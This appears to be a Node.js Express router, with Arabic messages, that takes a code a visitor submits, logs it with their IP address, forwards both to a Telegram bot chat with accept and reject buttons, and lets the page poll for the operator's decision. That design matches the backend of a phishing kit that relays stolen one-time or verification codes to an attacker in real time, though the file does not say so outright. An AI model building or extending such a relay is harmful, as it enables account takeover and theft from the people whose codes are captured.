const express = require("express");
const router = express.Router();
const Code = require("../models/Code");
const { initBot } = require("../botManager");

const { bot, chatId } = initBot();

router.post("/send-code", async (req, res) => {
  const { code } = req.body;

  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  if (ip.includes(",")) ip = ip.split(",")[0];
  ip = ip.replace("::ffff:", "").replace("::1", "127.0.0.1");

  try {
    const newCode = await Code.create({ code, ip });

    await bot.sendMessage(
      chatId,
      `🔐 *كود جديد:* \`${code}\`\n🌐 *الآيبي:* \`${ip}\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ قبول", callback_data: `accept_${newCode._id}` },
              { text: "❌ رفض", callback_data: `reject_${newCode._id}` },
            ],
          ],
        },
      }
    );

    res.json({ id: newCode._id });
  } catch (err) {
    console.error("❌ خطأ في إرسال الكود:", err.message);
    res.status(500).send("خطأ في إرسال الكود");
  }
});

router.get("/status/:id", async (req, res) => {
  try {
    const code = await Code.findById(req.params.id);
    if (!code) return res.status(404).json({ status: "not_found" });
    res.json({ status: code.status });
  } catch (err) {
    console.error("❌ خطأ:", err.message);
    res.status(500).send("خطأ");
  }
});

module.exports = router;